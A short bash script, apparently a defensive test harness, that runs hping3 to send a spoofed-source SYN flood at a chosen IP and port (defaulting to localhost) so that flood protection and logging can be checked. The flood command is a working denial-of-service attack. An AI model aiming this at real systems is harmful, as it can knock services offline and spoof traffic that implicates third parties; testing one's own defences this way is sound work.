#!/bin/bash
#
# SYN Flood Attack Simulation
# Tests TCP SYN flood protection
#

TARGET_IP="${1:-127.0.0.1}"
TARGET_PORT="${2:-80}"
PACKET_COUNT="${3:-10000}"

echo "=== SYN Flood Test ==="
echo "Target: $TARGET_IP:$TARGET_PORT"
echo "Packets: $PACKET_COUNT"
echo ""

# Check if hping3 is installed
if ! command -v hping3 &> /dev/null; then
    echo "Error: hping3 not installed"
    echo "Install with: sudo apt-get install hping3"
    exit 1
fi

echo "Starting SYN flood attack simulation..."
echo "Press Ctrl+C to stop"
echo ""

# Run SYN flood
sudo hping3 \
    --flood \
    --rand-source \
    --syn \
    -p "$TARGET_PORT" \
    -c "$PACKET_COUNT" \
    "$TARGET_IP"

echo ""
echo "Test complete"
echo "Check system logs for detection and mitigation"
